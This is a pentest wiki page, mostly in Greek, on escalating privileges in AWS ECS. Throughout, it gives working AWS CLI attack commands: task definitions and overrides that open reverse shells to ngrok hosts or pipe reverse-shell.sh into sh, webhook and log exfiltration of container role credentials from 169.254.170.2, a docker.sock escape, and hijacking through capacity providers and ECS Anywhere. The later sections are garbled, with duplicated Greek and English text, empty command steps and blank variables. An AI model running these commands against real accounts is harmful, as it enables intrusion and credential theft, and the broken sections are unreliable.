# AWS - ECS Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## ECS

Περισσότερες **πληροφορίες για το ECS** στο:

{{#ref}}
../../aws-services/aws-ecs-enum.md
{{#endref}}

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:RunTask`

Ένας επιτιθέμενος που καταχράται τα δικαιώματα `iam:PassRole`, `ecs:RegisterTaskDefinition` και `ecs:RunTask` στο ECS μπορεί να **δημιουργήσει ένα νέο task definition** με ένα **κακόβουλο container** που κλέβει τα metadata credentials και να το **τρέξει**.

{{#tabs }}
{{#tab name="Reverse Shell" }}
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

# Run task definition
aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:eu-west-1:947247140022:cluster/API \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"subnet-e282f9b8\"]}}"

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
{{#endtab }}

{{#tab name="Webhook" }}

Δημιουργήστε ένα webhook με έναν ιστότοπο όπως το webhook.site
```bash

# Create file container-definition.json
[
{
"name": "exfil_creds",
"image": "python:latest",
"entryPoint": ["sh", "-c"],
"command": [
"CREDS=$(curl -s http://169.254.170.2${AWS_CONTAINER_CREDENTIALS_RELATIVE_URI}); curl -X POST -H 'Content-Type: application/json' -d \"$CREDS\" https://webhook.site/abcdef12-3456-7890-abcd-ef1234567890"
]
}
]

# Run task definition, uploading the .json file
aws ecs register-task-definition \
--family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 \
--memory 512 \
--requires-compatibilities FARGATE \
--container-definitions file://container-definition.json

# Check the webhook for a response

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1

```
{{#endtab }}

{{#endtabs }}

**Potential Impact:** Άμεση privesc σε διαφορετικό ECS ρόλο.

### `iam:PassRole`,`ecs:RunTask`
Ένας επιτιθέμενος που διαθέτει τα δικαιώματα `iam:PassRole` και `ecs:RunTask` μπορεί να ξεκινήσει ένα νέο ECS task με τροποποιημένες τις **execution role**, **task role** και την **command** του container. Η εντολή CLI `ecs run-task` περιλαμβάνει την παράμετρο `--overrides` που επιτρέπει την αλλαγή σε runtime των `executionRoleArn`, `taskRoleArn` και της `command` του container χωρίς να αγγίξει το task definition.

Οι καθορισμένοι IAM ρόλοι για τα `taskRoleArn` και `executionRoleArn` πρέπει να εμπιστεύονται/επιτρέπουν να αναλαμβάνονται από το `ecs-tasks.amazonaws.com` στην trust policy τους.

Επίσης, ο επιτιθέμενος πρέπει να γνωρίζει:
- ECS cluster name
- VPC Subnet
- Security group (If no security group is specified the default one will be used)
- Task Definition Name and revision
- Name of the Container
```bash
aws ecs run-task \
--cluster <cluster-name> \
--launch-type FARGATE \
--network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],securityGroups=[<security-group-id>],assignPublicIp=ENABLED}" \
--task-definition <task-definition:revision> \
--overrides '
{
"taskRoleArn": "arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"containerOverrides": [
{
"name": <container-name>,
"command": ["nc", "4.tcp.eu.ngrok.io", "18798", "-e", "/bin/bash"]
}
]
}'
```
Στο παραπάνω απόσπασμα κώδικα ένας επιτιθέμενος αντικαθιστά μόνο την τιμή `taskRoleArn`. Ωστόσο, ο επιτιθέμενος πρέπει να έχει δικαίωμα `iam:PassRole` πάνω στο `taskRoleArn` που καθορίζεται στην εντολή και στο `executionRoleArn` που καθορίζεται στον ορισμό του task ώστε η επίθεση να πραγματοποιηθεί.

Εάν ο IAM ρόλος που ο επιτιθέμενος μπορεί να περάσει έχει επαρκή προνόμια για να τραβήξει εικόνα από το ECR και να ξεκινήσει το ECS task (`ecr:BatchCheckLayerAvailability`, `ecr:GetDownloadUrlForLayer`,`ecr:BatchGetImage`,`ecr:GetAuthorizationToken`) τότε ο επιτιθέμενος μπορεί να καθορίσει τον ίδιο IAM ρόλο τόσο για το `executionRoleArn` όσο και για το `taskRoleArn` στην εντολή `ecs run-task`.
```sh
aws ecs run-task --cluster <cluster-name> --launch-type FARGATE --network-configuration "awsvpcConfiguration={subnets=[<subnet-id>],securityGroups=[<security-group-id>],assignPublicIp=ENABLED}" --task-definition <task-definition:revision> --overrides '
{
"taskRoleArn": "arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"executionRoleArn":"arn:aws:iam::<redacted>:role/HighPrivilegedECSTaskRole",
"containerOverrides": [
{
"name": "<container-name>",
"command": ["nc", "4.tcp.eu.ngrok.io", "18798", "-e", "/bin/bash"]
}
]
}'
```
**Πιθανός Αντίκτυπος:** Άμεσο privesc σε οποιοδήποτε ECS task role.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`

Όπως στο προηγούμενο παράδειγμα, ένας επιτιθέμενος που εκμεταλλεύεται τα δικαιώματα **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:StartTask`** στο ECS μπορεί να **δημιουργήσει ένα νέο task definition** με ένα **κακόβουλο container** που κλέβει τα metadata credentials και να το **τρέξει**.\
Ωστόσο, σε αυτή την περίπτωση χρειάζεται να υπάρχει ένα container instance για να τρέξει το κακόβουλο task definition.
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn arn:aws:iam::947247140022:role/ecsTaskExecutionRole \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/0.tcp.ngrok.io/14280 0>&1\\\"\"]}]"

aws ecs start-task --task-definition iam_exfiltration \
--container-instances <instance_id>

# Delete task definition
## You need to remove all the versions (:1 is enough if you just created one)
aws ecs deregister-task-definition --task-definition iam_exfiltration:1
```
**Potential Impact:** Άμεσο privesc σε οποιονδήποτε ρόλο του ECS.

### `iam:PassRole`, `ecs:RegisterTaskDefinition`, (`ecs:UpdateService|ecs:CreateService)`

Όπως και στο προηγούμενο παράδειγμα, ένας επιτιθέμενος που καταχράται τα δικαιώματα **`iam:PassRole`, `ecs:RegisterTaskDefinition`, `ecs:UpdateService`** ή **`ecs:CreateService`** στο ECS μπορεί να **generate a new task definition** με ένα **malicious container** που κλέβει τα metadata credentials και να το **run it by creating a new service with at least 1 task running.**
```bash
# Generate task definition with rev shell
aws ecs register-task-definition --family iam_exfiltration \
--task-role-arn  "$ECS_ROLE_ARN" \
--network-mode "awsvpc" \
--cpu 256 --memory 512\
--requires-compatibilities "[\"FARGATE\"]" \
--container-definitions "[{\"name\":\"exfil_creds\",\"image\":\"python:latest\",\"entryPoint\":[\"sh\", \"-c\"],\"command\":[\"/bin/bash -c \\\"bash -i >& /dev/tcp/8.tcp.ngrok.io/12378 0>&1\\\"\"]}]"

# Run the task creating a service
aws ecs create-service --service-name exfiltration \
--task-definition iam_exfiltration \
--desired-count 1 \
--cluster "$CLUSTER_ARN" \
--launch-type FARGATE \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"ENABLED\", \"subnets\":[\"$SUBNET\"]}}"

# Run the task updating a service
aws ecs update-service --cluster <CLUSTER NAME> \
--service <SERVICE NAME> \
--task-definition <NEW TASK DEFINITION NAME>
```
**Potential Impact:** Άμεσο privesc σε οποιοδήποτε ECS role.

### `iam:PassRole`, (`ecs:UpdateService|ecs:CreateService)`

Στην πραγματικότητα, μόνο με αυτά τα δικαιώματα είναι δυνατόν να χρησιμοποιήσετε overrides για να εκτελέσετε αυθαίρετες εντολές σε ένα container με οποιοδήποτε role, με κάτι σαν:
```bash
aws ecs run-task \
--task-definition "<task-name>" \
--overrides '{"taskRoleArn":"<role-arn>", "containerOverrides":[{"name":"<container-name-in-task>","command":["/bin/bash","-c","curl https://reverse-shell.sh/6.tcp.eu.ngrok.io:18499 | sh"]}]}' \
--cluster <cluster-name> \
--network-configuration "{\"awsvpcConfiguration\":{\"assignPublicIp\": \"DISABLED\", \"subnets\":[\"<subnet-name>\"]}}"
```
**Πιθανός αντίκτυπος:** Άμεσο privesc σε οποιονδήποτε ρόλο ECS.

### `ecs:RegisterTaskDefinition`, **`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

Αυτό το σενάριο είναι σαν τα προηγούμενα αλλά **χωρίς** την άδεια **`iam:PassRole`**.\
Αυτό παραμένει ενδιαφέρον γιατί αν μπορείτε να τρέξετε ένα αυθαίρετο container, ακόμα κι αν είναι χωρίς ρόλο, θα μπορούσατε να **τρέξετε ένα privileged container για να escape** στο node και να **κλέψετε τον EC2 IAM role** και τους **άλλους ECS containers roles** που τρέχουν στον node.\
Μπορείτε ακόμη και να **αναγκάσετε άλλες εργασίες να τρέξουν μέσα στο EC2 instance** που συμβιβάζετε για να κλέψετε τα credentials τους (όπως συζητείται στην [**Privesc to node section**](aws-ecs-post-exploitation/README.md#privesc-to-node)).

> [!WARNING]
> Αυτή η επίθεση είναι δυνατή μόνο αν το **ECS cluster χρησιμοποιεί EC2** instances και όχι Fargate.
```bash
printf '[
{
"name":"exfil_creds",
"image":"python:latest",
"entryPoint":["sh", "-c"],
"command":["/bin/bash -c \\\"bash -i >& /dev/tcp/7.tcp.eu.ngrok.io/12976 0>&1\\\""],
"mountPoints": [
{
"readOnly": false,
"containerPath": "/var/run/docker.sock",
"sourceVolume": "docker-socket"
}
]
}
]' > /tmp/task.json

printf '[
{
"name": "docker-socket",
"host": {
"sourcePath": "/var/run/docker.sock"
}
}
]' > /tmp/volumes.json


aws ecs register-task-definition --family iam_exfiltration \
--cpu 256 --memory 512 \
--requires-compatibilities '["EC2"]' \
--container-definitions file:///tmp/task.json \
--volumes file:///tmp/volumes.json


aws ecs run-task --task-definition iam_exfiltration \
--cluster arn:aws:ecs:us-east-1:947247140022:cluster/ecs-takeover-ecs_takeover_cgidc6fgpq6rpg-cluster \
--launch-type EC2

# You will need to do 'apt update' and 'apt install docker.io' to install docker in the rev shell
```
### `ecs:ExecuteCommand`, `ecs:DescribeTasks,`**`(ecs:RunTask|ecs:StartTask|ecs:UpdateService|ecs:CreateService)`**

Ένας επιτιθέμενος με τις **`ecs:ExecuteCommand`, `ecs:DescribeTasks`** μπορεί να **εκτελέσει εντολές** μέσα σε ένα τρέχον container και να εξάγει το IAM role που είναι συνημμένο σε αυτό (χρειάζεσαι τα describe permissions γιατί είναι απαραίτητα για να τρέξεις `aws ecs execute-command`).\  
Ωστόσο, για να γίνει αυτό, το container instance πρέπει να τρέχει τον **ExecuteCommand agent** (ο οποίος από προεπιλογή δεν τρέχει).

Επομένως, ο επιτιθέμενος μπορεί να προσπαθήσει να:

- **Να τρέξει μια εντολή** σε κάθε container που τρέχει
```bash
# List enableExecuteCommand on each task
for cluster in $(aws ecs list-clusters | jq .clusterArns | grep '"' | cut -d '"' -f2); do
echo "Cluster $cluster"
for task in $(aws ecs list-tasks --cluster "$cluster" | jq .taskArns | grep '"' | cut -d '"' -f2); do
echo "  Task $task"
# If true, it's your lucky day
aws ecs describe-tasks --cluster "$cluster" --tasks "$task" | grep enableExecuteCommand
done
done

# Execute a shell in a container
aws ecs execute-command --interactive \
--command "sh" \
--cluster "$CLUSTER_ARN" \
--task "$TASK_ARN"
```
- Εάν έχει **`ecs:RunTask`**, τρέξε ένα task με `aws ecs run-task --enable-execute-command [...]`
- Εάν έχει **`ecs:StartTask`**, τρέξε ένα task με `aws ecs start-task --enable-execute-command [...]`
- Εάν έχει **`ecs:CreateService`**, δημιούργησε μια service με `aws ecs create-service --enable-execute-command [...]`
- Εάν έχει **`ecs:UpdateService`**, ενημέρωσε μια service με `aws ecs update-service --enable-execute-command [...]`

Μπορείς να βρεις **παραδείγματα αυτών των επιλογών** στις **προηγούμενες ECS privesc ενότητες**.

**Πιθανός αντίκτυπος:** Privesc σε διαφορετικό role που είναι συνημμένο σε containers.

### `ssm:StartSession`

Κοίτα στην **ssm privesc σελίδα** πώς μπορείς να καταχραστείς αυτή την άδεια για να **privesc σε ECS**:

{{#ref}}
../aws-ssm-privesc/README.md
{{#endref}}

### `iam:PassRole`, `ec2:RunInstances`

Κοίτα στην **ec2 privesc σελίδα** πώς μπορείς να καταχραστείς αυτές τις άδειες για να **privesc σε ECS**:

{{#ref}}
../aws-ec2-privesc/README.md
{{#endref}}

### `ecs:RegisterContainerInstance`, `ecs:DeregisterContainerInstance`, `ecs:StartTask`, `iam:PassRole`

Ένας επιτιθέμενος με αυτές τις άδειες θα μπορούσε ενδεχομένως να εγγράψει ένα EC2 instance σε ένα ECS cluster και να τρέξει tasks σε αυτό. Αυτό θα μπορούσε να επιτρέψει στον επιτιθέμενο να εκτελέσει αυθαίρετο κώδικα στο πλαίσιο των ECS tasks.

- TODO: Είναι δυνατό να εγγραφεί ένα instance από διαφορετικό AWS account έτσι ώστε τα tasks να τρέχουν σε μηχανές ελεγχόμενες από τον επιτιθέμενο??

### `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, `ecs:DescribeTaskSets`

> [!NOTE]
> TODO: Δοκιμάστε αυτό

Ένας επιτιθέμενος με τις άδειες `ecs:CreateTaskSet`, `ecs:UpdateServicePrimaryTaskSet`, και `ecs:DescribeTaskSets` μπορεί να **δημιουργήσει ένα κακόβουλο task set για μια υπάρχουσα ECS service και να ενημερώσει το primary task set**. Αυτό επιτρέπει στον επιτιθέμενο να **εκτελέσει αυθαίρετο κώδικα εντός της υπηρεσίας**.
```bash
# Register a task definition with a reverse shell
echo '{
"family": "malicious-task",
"containerDefinitions": [
{
"name": "malicious-container",
"image": "alpine",
"command": [
"sh",
"-c",
"apk add --update curl && curl https://reverse-shell.sh/2.tcp.ngrok.io:14510 | sh"
]
}
]
}' > malicious-task-definition.json

aws ecs register-task-definition --cli-input-json file://malicious-task-definition.json

# Create a malicious task set for the existing service
aws ecs create-task-set --cluster existing-cluster --service existing-service --task-definition malicious-task --network-configuration "awsvpcConfiguration={subnets=[subnet-0e2b3f6c],securityGroups=[sg-0f9a6a76],assignPublicIp=ENABLED}"

# Update the primary task set for the service
aws ecs update-service-primary-task-set --cluster existing-cluster --service existing-service --primary-task-set arn:aws:ecs:region:123456789012:task-set/existing-cluster/existing-service/malicious-task-set-id
```
**Πιθανός αντίκτυπος**: Εκτέλεση αυθαίρετου κώδικα στην επηρεασμένη υπηρεσία, ενδεχομένως επηρεάζοντας τη λειτουργικότητά της ή προκαλώντας εξαγωγή ευαίσθητων δεδομένων.

## Αναφορές

- [https://ruse.tech/blogs/ecs-attack-methods](https://ruse.tech/blogs/ecs-attack-methods)

{{#include ../../../../banners/hacktricks-training.md}}





### Hijack ECS Scheduling via Malicious Capacity Provider (EC2 ASG takeover)

Ένας επιτιθέμενος με δικαιώματα για διαχείριση ECS capacity providers και ενημέρωση services μπορεί να δημιουργήσει ένα EC2 Auto Scaling Group που ελέγχει, να το ενσωματώσει σε έναν ECS Capacity Provider, να το συσχετίσει με το στοχευόμενο cluster και να μεταφέρει μια θύμα υπηρεσία ώστε να χρησιμοποιεί αυτόν τον provider. Στη συνέχεια, τα tasks θα προγραμματιστούν σε EC2 instances που ελέγχονται από τον επιτιθέμενο, επιτρέποντας πρόσβαση σε επίπεδο λειτουργικού συστήματος για επιθεώρηση των containers και κλοπή των task role credentials.

Commands (us-east-1):

- Προαπαιτούμενα



- Create Launch Template for ECS agent to join target cluster



- Create Auto Scaling Group



- Create Capacity Provider from the ASG



- Associate the Capacity Provider to the cluster (optionally as default)



- Migrate a service to your provider



- Verify tasks land on attacker instances



- Optional: From the EC2 node, docker exec into target containers and read http://169.254.170.2 to obtain the task role credentials.

- Καθαρισμός



**Πιθανός αντίκτυπος:** EC2 nodes που ελέγχονται από τον επιτιθέμενο λαμβάνουν τα victim tasks, δίνοντας πρόσβαση σε επίπεδο λειτουργικού συστήματος στα containers και κλοπή των task IAM role credentials.


<details>
<summary>Step-by-step commands (copy/paste)</summary>
<pre>
export AWS_DEFAULT_REGION=us-east-1
CLUSTER=arn:aws:ecs:us-east-1:947247140022:cluster/ht-victim-cluster
# Instance profile for ECS nodes
aws iam create-role --role-name ht-ecs-instance-role --assume-role-policy-document Version:2012-10-17 || true
aws iam attach-role-policy --role-name ht-ecs-instance-role --policy-arn arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role || true
aws iam create-instance-profile --instance-profile-name ht-ecs-instance-profile || true
aws iam add-role-to-instance-profile --instance-profile-name ht-ecs-instance-profile --role-name ht-ecs-instance-role || true

VPC=vpc-18e6ac62
SUBNETS=

AMI=ami-0b570770164588ab4
USERDATA=IyEvYmluL2Jhc2gKZWNobyBFQ1NfQ0xVU1RFUj0gPj4gL2V0Yy9lY3MvZWNzLmNvbmZpZwo=
LT_ID=

ASG_ARN=

CP_NAME=htcp-8797
aws ecs create-capacity-provider --name  --auto-scaling-group-provider "autoScalingGroupArn=,managedScaling={status=ENABLED,targetCapacity=100},managedTerminationProtection=DISABLED"
aws ecs put-cluster-capacity-providers --cluster "" --capacity-providers  --default-capacity-provider-strategy capacityProvider=,weight=1

SVC=
# Task definition must be EC2-compatible (not Fargate-only)
aws ecs update-service --cluster "" --service "" --capacity-provider-strategy capacityProvider=,weight=1 --force-new-deployment

TASK=
CI=
aws ecs describe-container-instances --cluster "" --container-instances "" --query containerInstances[0].ec2InstanceId --output text
</pre>
</details>

### Backdoor compute in-cluster via ECS Anywhere EXTERNAL registration

Κακοχρησιμοποίηστε το ECS Anywhere για να καταχωρήσετε έναν host που ελέγχεται από τον επιτιθέμενο ως EXTERNAL container instance σε ένα θύμα ECS cluster και να εκτελέσετε tasks σε αυτόν τον host χρησιμοποιώντας privileged task και execution roles. Αυτό παρέχει έλεγχο σε επίπεδο λειτουργικού συστήματος για το πού εκτελούνται τα tasks (τον δικό σας υπολογιστή) και επιτρέπει κλοπή διαπιστευτηρίων/δεδομένων από tasks και προσαρτημένους όγκους (volumes) χωρίς να πειράξετε capacity providers ή ASGs.

- Απαιτούμενα δικαιώματα (παράδειγμα ελάχιστο):
- ecs:CreateCluster (optional), ecs:RegisterTaskDefinition, ecs:StartTask or ecs:RunTask
- ssm:CreateActivation, ssm:DeregisterManagedInstance, ssm:DeleteActivation
- iam:CreateRole, iam:AttachRolePolicy, iam:DeleteRole, iam:PassRole (for the ECS Anywhere instance role and task/execution roles)
- logs:CreateLogGroup/Stream, logs:PutLogEvents (if using awslogs)

- Επίπτωση: Εκτέλεση αυθαίρετων containers με επιλεγμένο taskRoleArn στον host του επιτιθέμενου; εξαγωγή task-role credentials από 169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI; πρόσβαση σε οποιαδήποτε volumes προσαρτημένα από tasks; πιο διακριτικό από τη χειραγώγηση capacity providers/ASGs.

Βήματα

1) Δημιουργία/εντοπισμός cluster (us-east-1)
```bash
aws ecs create-cluster --cluster-name ht-ecs-anywhere
```
2) Δημιουργία ECS Anywhere role και ενεργοποίηση SSM (για on-prem/EXTERNAL instance)
```bash
aws iam create-role --role-name ecsAnywhereRole \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ssm.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
aws iam attach-role-policy --role-name ecsAnywhereRole --policy-arn arn:aws:iam::aws:policy/AmazonSSMManagedInstanceCore
aws iam attach-role-policy --role-name ecsAnywhereRole --policy-arn arn:aws:iam::aws:policy/service-role/AmazonEC2ContainerServiceforEC2Role
ACTJSON=$(aws ssm create-activation --iam-role ecsAnywhereRole)
ACT_ID=$(echo $ACTJSON | jq -r .ActivationId); ACT_CODE=$(echo $ACTJSON | jq -r .ActivationCode)
```
3) Provision του attacker host και αυτόματη καταχώρισή του ως EXTERNAL (παράδειγμα: small AL2 EC2 ως “on‑prem”)

<details>
<summary>user-data.sh</summary>
```bash
#!/bin/bash
set -euxo pipefail
amazon-linux-extras enable docker || true
yum install -y docker curl jq
systemctl enable --now docker
curl -fsSL -o /root/ecs-anywhere-install.sh "https://amazon-ecs-agent.s3.amazonaws.com/ecs-anywhere-install-latest.sh"
chmod +x /root/ecs-anywhere-install.sh
/root/ecs-anywhere-install.sh --cluster ht-ecs-anywhere --activation-id ${ACT_ID} --activation-code ${ACT_CODE} --region us-east-1
```
</details>
```bash
AMI=$(aws ssm get-parameters --names /aws/service/ami-amazon-linux-latest/amzn2-ami-hvm-x86_64-gp2 --query 'Parameters[0].Value' --output text)
IID=$(aws ec2 run-instances --image-id $AMI --instance-type t3.micro \
--user-data file://user-data.sh --query 'Instances[0].InstanceId' --output text)
aws ec2 wait instance-status-ok --instance-ids $IID
```
4) Επαληθεύστε ότι ο EXTERNAL container instance έχει ενταχθεί
```bash
aws ecs list-container-instances --cluster ht-ecs-anywhere
aws ecs describe-container-instances --cluster ht-ecs-anywhere \
--container-instances <ci-arn> --query 'containerInstances[0].[ec2InstanceId,attributes]'
# ec2InstanceId will be mi-XXXXXXXX (SSM managed instance id) and attributes include ecs.capability.external
```
5) Δημιουργήστε task/execution roles, εγγράψτε EXTERNAL task definition και τρέξτε το στον attacker host
```bash
# roles
aws iam create-role --role-name ht-ecs-task-exec \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ecs-tasks.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
aws iam attach-role-policy --role-name ht-ecs-task-exec --policy-arn arn:aws:iam::aws:policy/service-role/AmazonECSTaskExecutionRolePolicy
aws iam create-role --role-name ht-ecs-task-role \
--assume-role-policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"Service":"ecs-tasks.amazonaws.com"},"Action":"sts:AssumeRole"}]}'
# attach any privileges you want to abuse to this task role

# task def (EXTERNAL launch)
cat > td-external.json << 'JSON'
{
"family": "ht-external",
"requiresCompatibilities": [ "EXTERNAL" ],
"networkMode": "bridge",
"memory": "256",
"cpu": "128",
"executionRoleArn": "arn:aws:iam::<account-id>:role/ht-ecs-task-exec",
"taskRoleArn": "arn:aws:iam::<account-id>:role/ht-ecs-task-role",
"containerDefinitions": [
{"name":"steal","image":"public.ecr.aws/amazonlinux/amazonlinux:latest",
"entryPoint":["/bin/sh","-c"],
"command":["REL=\$(printenv AWS_CONTAINER_CREDENTIALS_RELATIVE_URI); echo CREDS:; curl -s http://169.254.170.2\$REL; sleep 600"],
"memory": 128,
"logConfiguration":{"logDriver":"awslogs","options":{"awslogs-region":"us-east-1","awslogs-group":"/ht/ecs/anywhere","awslogs-stream-prefix":"steal"}}
}
]
}
JSON
aws logs create-log-group --log-group-name /ht/ecs/anywhere || true
aws ecs register-task-definition --cli-input-json file://td-external.json
CI=$(aws ecs list-container-instances --cluster ht-ecs-anywhere --query 'containerInstanceArns[0]' --output text)
aws ecs start-task --cluster ht-ecs-anywhere --task-definition ht-external \
--container-instances $CI
```
6) Από εδώ έχετε τον έλεγχο του host που τρέχει τα tasks. Μπορείτε να διαβάσετε τα task logs (αν awslogs) ή να κάνετε exec απευθείας στον host για να εξάγετε credentials/δεδομένα από τα tasks σας.



#### Παράδειγμα εντολής (placeholders)




### Hijack ECS Scheduling via Malicious Capacity Provider (EC2 ASG takeover)

An attacker with permissions to manage ECS capacity providers and update services can create an EC2 Auto Scaling Group they control, wrap it in an ECS Capacity Provider, associate it to the target cluster, and migrate a victim service to use this provider. Tasks will then be scheduled onto attacker-controlled EC2 instances, allowing OS-level access to inspect containers and steal task role credentials.

Commands (us-east-1):

- Προαπαιτούμενα



- Create Launch Template for ECS agent to join target cluster



- Create Auto Scaling Group



- Create Capacity Provider from the ASG



- Associate the Capacity Provider to the cluster (optionally as default)



- Migrate a service to your provider



- Verify tasks land on attacker instances



- Optional: From the EC2 node, docker exec into target containers and read http://169.254.170.2 to obtain the task role credentials.

- Cleanup



**Potential Impact:** Attacker-controlled EC2 nodes receive victim tasks, enabling OS-level access to containers and theft of task IAM role credentials.
